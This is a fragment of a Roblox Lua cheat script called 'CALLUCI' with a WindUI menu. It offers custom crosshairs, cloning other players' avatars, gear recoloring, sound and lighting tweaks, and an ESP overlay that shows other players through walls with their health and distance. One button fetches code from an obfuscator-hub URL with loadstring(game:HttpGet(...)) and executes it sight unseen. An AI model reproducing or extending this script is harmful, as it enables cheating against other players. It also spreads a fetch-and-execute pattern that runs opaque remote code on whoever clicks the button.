return line end local function BuildCrosshair() ClearCrosshair() if not CrosshairEnabled then return end RemoveGameCrosshair() if CrosshairType == "DOT" then local dot = Instance.new("Frame") dot.Parent = Holder dot.Size = UDim2.new(0,6,0,6) dot.Position = UDim2.new(0,-3,0,-3) dot.BorderSizePixel = 0 dot.BackgroundColor3 = CrosshairColor local corner = Instance.new("UICorner") corner.CornerRadius = UDim.new(1,0) corner.Parent = dot elseif CrosshairType == "CROSS" then CreateLine(-18,-1,14,2) CreateLine(4,-1,14,2) CreateLine(-1,-18,2,14) CreateLine(-1,4,2,14) elseif CrosshairType == "X" then CreateLine(-12,-1,24,2,45) CreateLine(-12,-1,24,2,-45) elseif CrosshairType == "CIRCLE" then local circle = Instance.new("Frame") circle.Parent = Holder circle.Size = UDim2.new(0,22,0,22) circle.Position = UDim2.new(0,-11,0,-11) circle.BackgroundTransparency = 1 circle.BorderSizePixel = 2 circle.BorderColor3 = CrosshairColor local corner = Instance.new("UICorner") corner.CornerRadius = UDim.new(1,0) corner.Parent = circle elseif CrosshairType == "STAR" then CreateLine(-20,-1,16,2) CreateLine(4,-1,16,2) CreateLine(-1,-20,2,16) CreateLine(-1,4,2,16) CreateLine(-14,-1,28,2,45) CreateLine(-14,-1,28,2,-45) elseif CrosshairType == "SNIPER" then CreateLine(-60,-1,50,2) CreateLine(10,-1,50,2) CreateLine(-1,-60,2,50) CreateLine(-1,10,2,50) local circle = Instance.new("Frame") circle.Parent = Holder circle.Size = UDim2.new(0,70,0,70) circle.Position = UDim2.new(0,-35,0,-35) circle.BackgroundTransparency = 1 circle.BorderSizePixel = 2 circle.BorderColor3 = CrosshairColor local corner = Instance.new("UICorner") corner.CornerRadius = UDim.new(1,0) corner.Parent = circle elseif CrosshairType == "BOX" then local box = Instance.new("Frame") box.Parent = Holder box.Size = UDim2.new(0,24,0,24) box.Position = UDim2.new(0,-12,0,-12) box.BackgroundTransparency = 1 box.BorderSizePixel = 2 box.BorderColor3 = CrosshairColor elseif CrosshairType == "SMALL CROSS" then CreateLine(-10,-1,6,2) CreateLine(4,-1,6,2) CreateLine(-1,-10,2,6) CreateLine(-1,4,2,6) elseif CrosshairType == "BIG DOT" then local dot = Instance.new("Frame") dot.Parent = Holder dot.Size = UDim2.new(0,12,0,12) dot.Position = UDim2.new(0,-6,0,-6) dot.BorderSizePixel = 0 dot.BackgroundColor3 = CrosshairColor local corner = Instance.new("UICorner") corner.CornerRadius = UDim.new(1,0) corner.Parent = dot elseif CrosshairType == "T SHAPE" then CreateLine(-18,-1,14,2) CreateLine(4,-1,14,2) CreateLine(-1,4,2,14) end end CrosshairTab:Toggle({ Title = "Enable Crosshair", Callback = function(v) CrosshairEnabled = v BuildCrosshair() end }) CrosshairTab:Dropdown({ Title = "Crosshair Model", Values = {"DOT","BIG DOT","CROSS","SMALL CROSS","X","CIRCLE","STAR","SNIPER","BOX","T SHAPE"}, Callback = function(v) CrosshairType = v BuildCrosshair() end }) CrosshairTab:Colorpicker({ Title = "Crosshair Color", Default = Color3.new(1,1,1), Callback = function(v) CrosshairColor = v BuildCrosshair() end }) CrosshairTab:Button({ Title = "Reset Crosshair", Callback = function() CrosshairType = "DOT" CrosshairColor = Color3.new(1,1,1) BuildCrosshair() WindUI:Notify({Title = "CALLUCI", Content = "Crosshair reset", Duration = 2}) end }) RunService.RenderStepped:Connect(function() if CrosshairEnabled then pcall(function() LocalPlayer:GetMouse().Icon = "rbxassetid://0" end) end end) SkinChangerTab:Paragraph({ Title = "SKIN CHANGER", Desc = "Copy skins from other players" }) local SelectedPlayer = nil local UsernameSkin = "" local function GetPlayerNames() local t = {} for _,plr in pairs(Players:GetPlayers()) do if plr ~= LocalPlayer then table.insert(t, plr.Name) end end return t end SkinChangerTab:Dropdown({ Title = "Select Player", Values = GetPlayerNames(), Callback = function(v) SelectedPlayer = Players:FindFirstChild(v) end }) SkinChangerTab:Input({ Title = "Username Skin", Placeholder = "Enter Username", Callback = function(v) UsernameSkin = v end }) local function RemoveOldStuff(char) for _,v in pairs(char:GetChildren()) do if v:IsA("Accessory") or v:IsA("Hat") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("BodyColors") then v:Destroy() end end end local function CopyClothes(targetChar, char) for _,v in pairs(targetChar:GetChildren()) do if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("BodyColors") then local clone = v:Clone() clone.Parent = char end end end local function CopyFace(targetChar, char) local targetHead = targetChar:FindFirstChild("Head") local localHead = char:FindFirstChild("Head") if targetHead and localHead then for _,v in pairs(localHead:GetChildren()) do if v:IsA("Decal") then v:Destroy() end end for _,v in pairs(targetHead:GetChildren()) do if v:IsA("Decal") then local clone = v:Clone() clone.Parent = localHead end end end end local function CopyAccessories(targetChar, char) for _,acc in pairs(targetChar:GetChildren()) do if acc:IsA("Accessory") then local cloned = acc:Clone() cloned.Parent = char local handle = cloned:FindFirstChild("Handle") if handle then handle.Anchored = false handle.CanCollide = false handle.Massless = true for _,v in pairs(handle:GetChildren()) do if v:IsA("Weld") or v:IsA("Motor6D") or v:IsA("AccessoryWeld") or v:IsA("WeldConstraint") then v:Destroy() end end local attachment = handle:FindFirstChildOfClass("Attachment") if attachment then for _,part in pairs(char:GetDescendants()) do if part:IsA("BasePart") then local charAttachment = part:FindFirstChild(attachment.Name, true) if charAttachment then handle.CFrame = charAttachment.WorldCFrame * attachment.CFrame:Inverse() local weld = Instance.new("Weld") weld.Part0 = handle weld.Part1 = part weld.C0 = attachment.CFrame weld.C1 = charAttachment.CFrame weld.Parent = handle break end end end else local head = char:FindFirstChild("Head") if head then handle.CFrame = head.CFrame local weld = Instance.new("WeldConstraint") weld.Part0 = handle weld.Part1 = head weld.Parent = handle end end end end end end local function CopyCharacterAppearance(targetChar) local char = LocalPlayer.Character if not char then return end RemoveOldStuff(char) CopyClothes(targetChar, char) CopyFace(targetChar, char) CopyAccessories(targetChar, char) end local SavedSkin = nil local function SaveCurrentSkin() local char = LocalPlayer.Character if not char then return end if SavedSkin then SavedSkin:Destroy() end SavedSkin = Instance.new("Folder") for _,v in pairs(char:GetChildren()) do if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("BodyColors") then v:Clone().Parent = SavedSkin end end local head = char:FindFirstChild("Head") if head then local faceFolder = Instance.new("Folder") faceFolder.Name = "Face" for _,v in pairs(head:GetChildren()) do if v:IsA("Decal") then v:Clone().Parent = faceFolder end end faceFolder.Parent = SavedSkin end end local function LoadSavedSkin() if not SavedSkin then return end local char = LocalPlayer.Character if not char then return end RemoveOldStuff(char) local head = char:FindFirstChild("Head") if head then for _,v in pairs(head:GetChildren()) do if v:IsA("Decal") then v:Destroy() end end end for _,v in pairs(SavedSkin:GetChildren()) do if v.Name == "Face" then if head then for _,face in pairs(v:GetChildren()) do face:Clone().Parent = head end end else v:Clone().Parent = char end end end SkinChangerTab:Button({ Title = "Copy Player Skin", Callback = function() if not SelectedPlayer then return end if not SelectedPlayer.Character then return end CopyCharacterAppearance(SelectedPlayer.Character) WindUI:Notify({Title = "CALLUCI", Content = "Skin copied from " .. SelectedPlayer.Name, Duration = 2}) end }) SkinChangerTab:Button({ Title = "Save Current Skin", Callback = function() SaveCurrentSkin() WindUI:Notify({Title = "CALLUCI", Content = "Skin saved", Duration = 2}) end }) SkinChangerTab:Button({ Title = "Load Saved Skin", Callback = function() LoadSavedSkin() WindUI:Notify({Title = "CALLUCI", Content = "Skin loaded", Duration = 2}) end }) SkinChangerTab:Button({ Title = "Copy Username Skin", Callback = function() if UsernameSkin == "" then return end local success, userId = pcall(function() return Players:GetUserIdFromNameAsync(UsernameSkin) end) if not success then return end local success2, model = pcall(function() return Players:CreateHumanoidModelFromUserId(userId) end) if success2 and model then CopyCharacterAppearance(model) model:Destroy() WindUI:Notify({Title = "CALLUCI", Content = "Skin copied from " .. UsernameSkin, Duration = 2}) end end }) SkinChangerTab:Button({ Title = "Refresh Players", Callback = function() local names = GetPlayerNames() WindUI:Notify({Title = "CALLUCI", Content = "Players refreshed: " .. #names .. " found", Duration = 2}) end }) SkinTab:Paragraph({ Title = "CRIME GEAR SKINS", Desc = "Apply special skins to your crime gear" }) local SelectedSkin = "REALISTIC GOLD" SkinTab:Dropdown({ Title = "Crime Gear Skin", Values = {"REALISTIC GOLD","CHROME","DIAMOND","RUBY","EMERALD","BLACK ICE","GALAXY","OBSIDIAN"}, Callback = function(v) SelectedSkin = v end }) local function applyMaterial(part) if SelectedSkin == "REALISTIC GOLD" then part.Color = Color3.fromRGB(212,175,55) part.Material = Enum.Material.Metal part.Reflectance = 0.15 elseif SelectedSkin == "CHROME" then part.Color = Color3.fromRGB(220,220,220) part.Material = Enum.Material.Metal part.Reflectance = 0.3 elseif SelectedSkin == "DIAMOND" then part.Color = Color3.fromRGB(185,242,255) part.Material = Enum.Material.Glass part.Transparency = 0.08 part.Reflectance = 0.1 elseif SelectedSkin == "RUBY" then part.Color = Color3.fromRGB(170,0,0) part.Material = Enum.Material.Neon elseif SelectedSkin == "EMERALD" then part.Color = Color3.fromRGB(0,170,100) part.Material = Enum.Material.Neon elseif SelectedSkin == "BLACK ICE" then part.Color = Color3.fromRGB(40,40,50) part.Material = Enum.Material.Glass part.Transparency = 0.05 elseif SelectedSkin == "GALAXY" then part.Color = Color3.fromRGB(90,0,170) part.Material = Enum.Material.Neon elseif SelectedSkin == "OBSIDIAN" then part.Color = Color3.fromRGB(15,15,15) part.Material = Enum.Material.Slate end end SkinTab:Button({ Title = "Apply Crime Gear", Callback = function() local char = LocalPlayer.Character if not char then return end local count = 0 for _,v in pairs(char:GetDescendants()) do if v:IsA("MeshPart") then pcall(function() if v.TextureID == "rbxassetid://17712967030" or v.TextureID == "rbxassetid://17712965665" then v.TextureID = "" applyMaterial(v) count = count + 1 end end) end if v:IsA("BasePart") then local n = v.Name:lower() if n:find("vest") or n:find("armor") or n:find("schutz") or n:find("gear") or n:find("crime") then applyMaterial(v) count = count + 1 end end if v:IsA("Texture") or v:IsA("Decal") then pcall(function() v:Destroy() end) end if v:IsA("SpecialMesh") then if SelectedSkin == "REALISTIC GOLD" then v.VertexColor = Vector3.new(1,0.84,0) elseif SelectedSkin == "CHROME" then v.VertexColor = Vector3.new(0.9,0.9,0.9) elseif SelectedSkin == "DIAMOND" then v.VertexColor = Vector3.new(0.7,1,1) elseif SelectedSkin == "RUBY" then v.VertexColor = Vector3.new(1,0,0) elseif SelectedSkin == "EMERALD" then v.VertexColor = Vector3.new(0,1,0.5) elseif SelectedSkin == "BLACK ICE" then v.VertexColor = Vector3.new(0.2,0.2,0.25) elseif SelectedSkin == "GALAXY" then v.VertexColor = Vector3.new(0.5,0,1) elseif SelectedSkin == "OBSIDIAN" then v.VertexColor = Vector3.new(0.1,0.1,0.1) end end end WindUI:Notify({Title = "CALLUCI", Content = "Applied " .. SelectedSkin .. " to " .. count .. " items", Duration = 2}) end }) SoundTab:Paragraph({ Title = "MUSIC", Desc = "Play background music" }) local Song = Instance.new("Sound") Song.Name = "CalluciMusic" Song.Parent = Workspace Song.Volume = 2 Song.Looped = true SoundTab:Dropdown({ Title = "Chill Songs", Values = {"Tokyo Drift","Phonk","Chill"}, Callback = function(v) Song.SoundId = ChillSongs[v] Song:Play() WindUI:Notify({Title = "CALLUCI", Content = "Now playing: " .. v, Duration = 2}) end }) SoundTab:Button({ Title = "Stop Music", Callback = function() Song:Stop() WindUI:Notify({Title = "CALLUCI", Content = "Music stopped", Duration = 2}) end }) SoundTab:Button({ Title = "Volume Up", Callback = function() Song.Volume = math.min(Song.Volume + 1, 10) WindUI:Notify({Title = "CALLUCI", Content = "Volume: " .. Song.Volume, Duration = 2}) end }) SoundTab:Button({ Title = "Volume Down", Callback = function() Song.Volume = math.max(Song.Volume - 1, 0) WindUI:Notify({Title = "CALLUCI", Content = "Volume: " .. Song.Volume, Duration = 2}) end }) SoundTab:Paragraph({ Title = "HELICOPTER SETTINGS", Desc = "Disable helicopter sounds and lights" }) SoundTab:Toggle({ Title = "Mute Helicopter", Callback = function(state) local count = 0 for _,obj in pairs(Workspace:GetDescendants()) do if obj:IsA("Sound") then local fullname = string.lower(obj:GetFullName()) if string.find(fullname,"helicopter") or string.find(fullname,"heli") or string.find(fullname,"rotor") then if state then obj.Volume = 0 else obj.Volume = 1 end count = count + 1 end end end WindUI:Notify({Title = "CALLUCI", Content = "Muted " .. count .. " sounds", Duration = 2}) end }) SoundTab:Toggle({ Title = "Disable Helicopter Spotlight", Callback = function(state) local count = 0 for _,obj in pairs(Workspace:GetDescendants()) do if obj.Name == "Spotlight" then for _,light in pairs(obj:GetDescendants()) do if light:IsA("SpotLight") or light:IsA("PointLight") or light:IsA("SurfaceLight") then light.Enabled = not state count = count + 1 end end end end WindUI:Notify({Title = "CALLUCI", Content = "Toggled " .. count .. " lights", Duration = 2}) end }) PlayerTab:Paragraph({ Title = "PLAYER ESP", Desc = "See other players through walls" }) local healthSystemEnabled = false local espEnabled = false local healthColorValue = Color3.fromRGB(0, 255, 100) local espColorValue = Color3.fromRGB(255, 255, 255) local playerDrawings = {} PlayerTab:Toggle({ Title = "Health System", Desc = "Show health bar", Callback = function(v) healthSystemEnabled = v WindUI:Notify({Title = "CALLUCI", Content = "Health System: " .. tostring(v), Duration = 2}) end }) PlayerTab:Toggle({ Title = "ESP", Desc = "Highlight players", Callback = function(v) espEnabled = v if not v then for _, drawing in pairs(playerDrawings) do for _, obj in pairs(drawing) do obj:Remove() end end playerDrawings = {} end WindUI:Notify({Title = "CALLUCI", Content = "ESP: " .. tostring(v), Duration = 2}) end }) local HealthColorGroup = PlayerTab:Group({}) HealthColorGroup:Colorpicker({ Title = "Health Color", Flag = "HealthColorPicker", Default = Color3.fromRGB(0, 255, 100), Transparency = 0, Callback = function(color) healthColorValue = color end }) local ESPColorGroup = PlayerTab:Group({}) ESPColorGroup:Colorpicker({ Title = "ESP Color", Flag = "ESPColorPicker", Default = Color3.fromRGB(255, 255, 255), Transparency = 0, Callback = function(color) espColorValue = color end }) local function newLine() local l = Drawing.new("Line") l.Thickness = 1.5 l.Transparency = 1 l.Visible = false return l end local function newText() local t = Drawing.new("Text") t.Size = 13 t.Center = true t.Outline = true t.Font = Drawing.Fonts.UI t.Visible = false return t end local function newSquare() local s = Drawing.new("Square") s.Transparency = 1 s.Visible = false return s end local function setupDrawingsForPlayer(player) if not playerDrawings[player] then playerDrawings[player] = { tl_h = newLine(), tl_v = newLine(), tr_h = newLine(), tr_v = newLine(), bl_h = newLine(), bl_v = newLine(), br_h = newLine(), br_v = newLine(), -- Health Bar healthBarBg = newSquare(), healthBar = newSquare(), nameText = newText(), distText = newText(), } end end local function removeDrawingsForPlayer(player) if playerDrawings[player] then for _, obj in pairs(playerDrawings[player]) do obj:Remove() end playerDrawings[player] = nil end end local function drawCorners(d, pos, size, color) local x, y = pos.X, pos.Y local w, h = size.X, size.Y local cl = math.floor(w * 0.25) -- Oben-Links d.tl_h.From = Vector2.new(x, y); d.tl_h.To = Vector2.new(x + cl, y); d.tl_h.Color = color; d.tl_h.Visible = true d.tl_v.From = Vector2.new(x, y); d.tl_v.To = Vector2.new(x, y + cl); d.tl_v.Color = color; d.tl_v.Visible = true -- Oben-Rechts d.tr_h.From = Vector2.new(x+w, y); d.tr_h.To = Vector2.new(x+w-cl, y); d.tr_h.Color = color; d.tr_h.Visible = true d.tr_v.From = Vector2.new(x+w, y); d.tr_v.To = Vector2.new(x+w, y + cl); d.tr_v.Color = color; d.tr_v.Visible = true -- Unten-Links d.bl_h.From = Vector2.new(x, y+h); d.bl_h.To = Vector2.new(x + cl, y+h); d.bl_h.Color = color; d.bl_h.Visible = true d.bl_v.From = Vector2.new(x, y+h); d.bl_v.To = Vector2.new(x, y+h-cl); d.bl_v.Color = color; d.bl_v.Visible = true -- Unten-Rechts d.br_h.From = Vector2.new(x+w, y+h); d.br_h.To = Vector2.new(x+w-cl, y+h); d.br_h.Color = color; d.br_h.Visible = true d.br_v.From = Vector2.new(x+w, y+h); d.br_v.To = Vector2.new(x+w, y+h-cl); d.br_v.Color = color; d.br_v.Visible = true end local function hideCorners(d) d.tl_h.Visible = false; d.tl_v.Visible = false d.tr_h.Visible = false; d.tr_v.Visible = false d.bl_h.Visible = false; d.bl_v.Visible = false d.br_h.Visible = false; d.br_v.Visible = false end local function updateESP() if not LocalPlayer.Character then return end if not espEnabled then return end for _, player in ipairs(Players:GetPlayers()) do if player == LocalPlayer then continue end local character = player.Character if not character or not character:FindFirstChild("Humanoid") or not character:FindFirstChild("HumanoidRootPart") then removeDrawingsForPlayer(player) continue end local humanoid = character.Humanoid local hrp = character.HumanoidRootPart local pos3d, onScreen = Camera:WorldToViewportPoint(hrp.Position) if not onScreen then removeDrawingsForPlayer(player) continue end setupDrawingsForPlayer(player) local d = playerDrawings[player] local dist = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - hrp.Position).Magnitude) local scale = 1000 / dist local bw = 4 * scale local bh = 6 * scale local bx = pos3d.X - bw / 2 local by = pos3d.Y - bh / 2 drawCorners(d, Vector2.new(bx, by), Vector2.new(bw, bh), espColorValue) d.nameText.Visible = true d.nameText.Text = player.Name d.nameText.Position = Vector2.new(pos3d.X, by - 16) d.nameText.Color = espColorValue d.nameText.Size = math.clamp(scale * 0.55, 11, 16) d.distText.Visible = true d.distText.Text = dist .. " studs" d.distText.Position = Vector2.new(pos3d.X, by + bh + 4) d.distText.Color = Color3.fromRGB(180, 180, 180) d.distText.Size = math.clamp(scale * 0.45, 10, 13) if healthSystemEnabled then local hp = math.clamp(humanoid.Health / humanoid.MaxHealth, 0, 1) local barH = bh local barW = 4 d.healthBarBg.Visible = true d.healthBarBg.Filled = true d.healthBarBg.Color = Color3.new(0, 0, 0) d.healthBarBg.Transparency = 0.6 d.healthBarBg.Size = Vector2.new(barW, barH) d.healthBarBg.Position = Vector2.new(bx - barW - 3, by) d.healthBar.Visible = true d.healthBar.Filled = true d.healthBar.Transparency = 1 d.healthBar.Size = Vector2.new(barW, barH * hp) d.healthBar.Position = Vector2.new(bx - barW - 3, by + barH * (1 - hp)) d.healthBar.Color = healthColorValue else d.healthBarBg.Visible = false d.healthBar.Visible = false end end end RunService.RenderStepped:Connect(updateESP) Players.PlayerRemoving:Connect(removeDrawingsForPlayer) PlayerTab:Button({ Title = "ENABLE CALLUCI CHEAT UI", Callback = function() loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/2f3r5fcs"))() end, }) WorldTab:Paragraph({ Title = "WORLD SETTINGS", Desc = "Modify the game world" }) WorldTab:Button({ Title = "Remove Fog", Callback = function() Lighting.FogEnd = 100000 WindUI:Notify({Title = "CALLUCI", Content = "Fog removed", Duration = 2}) end }) WorldTab:Button({ Title = "Clear Atmosphere", Callback = function() local count = 0 for _,v in pairs(Lighting:GetChildren()) do if v:IsA("Atmosphere") then v:Destroy() count = count + 1 end end WindUI:Notify({Title = "CALLUCI", Content = "Removed " .. count .. " atmospheres", Duration = 2}) end }) WorldTab:Paragraph({ Title = "TERRAIN", Desc = "Change terrain colors and styles" }) local RGBGrass = false local Darkness = 0 local CurrentStyle = "Default" local function DarkenColor(color) local multiplier = 1 - Darkness return Color3.new(color.R * multiplier, color.G * multiplier, color.B * multiplier) end local function ApplyTerrainColor(color) local finalColor = DarkenColor(color) Workspace.Terrain:SetMaterialColor(Enum.Material.Grass, finalColor) Workspace.Terrain:SetMaterialColor(Enum.Material.LeafyGrass, finalColor) end local function UpdateTerrain() RGBGrass = false if CurrentStyle == "Default" then ApplyTerrainColor(Color3.fromRGB(106,127,63)) elseif CurrentStyle == "Desert" then ApplyTerrainColor(Color3.fromRGB(255,221,120)) elseif CurrentStyle == "Black" then ApplyTerrainColor(Color3.fromRGB(0,0,0)) elseif CurrentStyle == "Snow" then ApplyTerrainColor(Color3.fromRGB(255,255,255)) elseif CurrentStyle == "Pink" then ApplyTerrainColor(Color3.fromRGB(255,0,170)) elseif CurrentStyle == "Blue" then ApplyTerrainColor(Color3.fromRGB(0,170,255)) elseif CurrentStyle == "Smooth" then ApplyTerrainColor(Color3.fromRGB(75,120,55)) elseif CurrentStyle == "RGB" then RGBGrass = true task.spawn(function() while RGBGrass do local hue = (tick() % 5) / 5 local color = Color3.fromHSV(hue,1,1) ApplyTerrainColor(color) task.wait(0.1) end end) end end WorldTab:Slider({ Title = "Terrain Darkness", Value = {Min = 0, Max = 100, Default = 0}, Callback = function(v) Darkness = v / 100 UpdateTerrain() end }) WorldTab:Dropdown({ Title = "Terrain Style", Values = {"Default","Desert","Black","Snow","Pink","Blue","RGB","Smooth"}, Default = "Default", Callback = function(v) CurrentStyle = v UpdateTerrain() WindUI:Notify({Title = "CALLUCI", Content = "Terrain style: " .. v, Duration = 2}) end }) UpdateTerrain() MiscTab:Paragraph({ Title = "MISCELLANEOUS", Desc = "Various useful tools" }) MiscTab:Button({ Title = "Rejoin Game", Callback = function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end }) MiscTab:Button({ Title = "FPS Boost (Basic)", Callback = function() Lighting.GlobalShadows = false settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 WindUI:Notify({Title = "CALLUCI", Content = "Basic FPS Boost Applied", Duration = 2}) end }) MiscTab:Button({ Title = "FPS Boost (Extreme)", Callback = function() Lighting.GlobalShadows = false Lighting.FogEnd = 100000 Lighting.Brightness = 1 Workspace.Terrain.WaterWaveSize = 0 Workspace.Terrain.WaterWaveSpeed = 0 Workspace.Terrain.WaterReflectance = 0 Workspace.Terrain.WaterTransparency = 1 for _,v in pairs(Lighting:GetDescendants()) do if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("DepthOfFieldEffect") then v.Enabled = false end end for _,obj in pairs(Workspace:GetDescendants()) do if obj:IsA("BasePart") then obj.Material = Enum.Material.Plastic obj.Reflectance = 0 end if obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency = 1 end if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then obj.Enabled = false end end settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 WindUI:Notify({Title = "CALLUCI", Content = "Extreme FPS Boost Applied", Duration = 3}) end }) MiscTab:Button({ Title = "Reset Lighting", Callback = function() Lighting.GlobalShadows = true Lighting.FogEnd = 100000 Lighting.Brightness = 2 Lighting.Ambient = Color3.fromRGB(127,127,127) WindUI:Notify({Title = "CALLUCI", Content = "Lighting Reset", Duration = 2}) end }) ShinyTab:Paragraph({ Title = "SHINY EFFECT", Desc = "Make your character glow" }) local ShinyEnabled = false local BlackRoads = false local function ApplyShiny() local char = LocalPlayer.Character if not char then return end local count = 0 for _,v in pairs(char:GetDescendants()) do if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("UnionOperation") then if v.Name ~= "HumanoidRootPart" then v.Material = Enum.Material.Glass v.Reflectance = 0.35 v.CastShadow = false count = count + 1 end end end Lighting.Brightness = 3 Lighting.Technology = Enum.Technology.Future local bloom = Lighting:FindFirstChild("CalluciBloom") if not bloom then bloom = Instance.new("BloomEffect") bloom.Name = "CalluciBloom" bloom.Intensity = 2.5 bloom.Size = 60 bloom.Threshold = 0.7 bloom.Parent = Lighting end WindUI:Notify({Title = "CALLUCI", Content = "Shiny applied to " .. count .. " parts", Duration = 2}) end local function RemoveShiny() local char = LocalPlayer.Character if not char then return end for _,v in pairs(char:GetDescendants()) do if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("UnionOperation") then if v.Name ~= "HumanoidRootPart" then v.Material = Enum.Material.Plastic v.Reflectance = 0 end end end local bloom = Lighting:FindFirstChild("CalluciBloom") if bloom then bloom:Destroy() end WindUI:Notify({Title = "CALLUCI", Content = "Shiny removed", Duration = 2}) end local function ApplyBlackRoads() local count = 0 for _,v in pairs(Workspace:GetDescendants()) do if v:IsA("BasePart") then local c = v.Color if c.R > 0.7 and c.G > 0.7 and c.B > 0.7 then if v.Size.Y <= 1.5 then v.Color = Color3.new(0,0,0) v.Material = Enum.Material.SmoothPlastic count = count + 1 end end end if v:IsA("Texture") or v:IsA("Decal") then pcall(function() v.Color3 = Color3.new(0,0,0) end) end end WindUI:Notify({Title = "CALLUCI", Content = "Black roads applied to " .. count .. " parts", Duration = 2}) end ShinyTab:Toggle({ Title = "Enable Shiny", Callback = function(v) ShinyEnabled = v if v then ApplyShiny() else RemoveShiny() end end }) ShinyTab:Toggle({ Title = "Black Road Lines", Callback = function(v) BlackRoads = v if v then ApplyBlackRoads() end end }) ShinyTab:Button({ Title = "Reapply Shiny", Callback = function() if ShinyEnabled then ApplyShiny() end if BlackRoads then ApplyBlackRoads() end end }) LocalPlayer.CharacterAdded:Connect(function() task.wait(1) if ShinyEnabled then ApplyShiny() end if BlackRoads then ApplyBlackRoads() end end) WeaponSoundTab:Paragraph({ Title = "WEAPON SOUNDS", Desc = "Customize weapon sound effects" }) local soundinputs = {} local customsoundlist = {"Default"} if CustomSounds then for customName, _ in pairs(CustomSounds) do table.insert(customsoundlist, customName) end end local soundFolder = nil for _, folder in ipairs(ReplicatedStorage:GetChildren()) do if folder:IsA("Folder") then local children = folder:GetChildren() if #children > 0 and children[1]:IsA("Sound") then soundFolder = folder break end end end for name, id in pairs(WeaponSounds) do local foundSound = nil if soundFolder then for _, obj in ipairs(soundFolder:GetDescendants()) do if obj:IsA("Sound") and obj.SoundId == id then foundSound = obj break end end end if foundSound then local currentSound = foundSound table.insert(soundinputs, WeaponSoundTab:Dropdown({ Title = name .. " Sound", Values = customsoundlist, Multi = false, AllowNone = false, Value = "Default", Flag = name, Callback = function(option) if option == "Default" then currentSound.SoundId = id elseif CustomSounds and CustomSounds[option] then currentSound.SoundId = CustomSounds[option] end WindUI:Notify({Title = "CALLUCI", Content = name .. " sound changed to " .. option, Duration = 2}) end })) end end CustomTab:Paragraph({ Title = "CUSTOMIZATION", Desc = "Customize the UI and cursor" }) local function ApplyFont(font) for _,v in pairs(game:GetDescendants()) do if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then pcall(function() v.Font = font end) end end WindUI:Notify({Title = "CALLUCI", Content = "Font applied", Duration = 2}) end local function ApplyCursor(id) UIS.MouseIconEnabled = true if id == "" then UIS.MouseIcon = "" return end UIS.MouseIcon = id WindUI:Notify({Title = "CALLUCI", Content = "Cursor applied", Duration = 2}) end CustomTab:Dropdown({ Title = "Font", Values = {"Gotham","GothamBold","Code","Arcade","SciFi","SourceSans","Fantasy"}, Callback = function(v) ApplyFont(Fonts[v]) end }) CustomTab:Dropdown({ Title = "Cursor", Values = {"Default","Crosshair","Dot","Circle","Target"}, Callback = function(v) ApplyCursor(Cursors[v]) end }) CustomTab:Button({ Title = "Reset Customization", Callback = function() ApplyFont(Enum.Font.Gotham) ApplyCursor("") WindUI:Notify({Title = "CALLUCI", Content = "Customization Reset", Duration = 2}) end }) Window:SelectTab(1)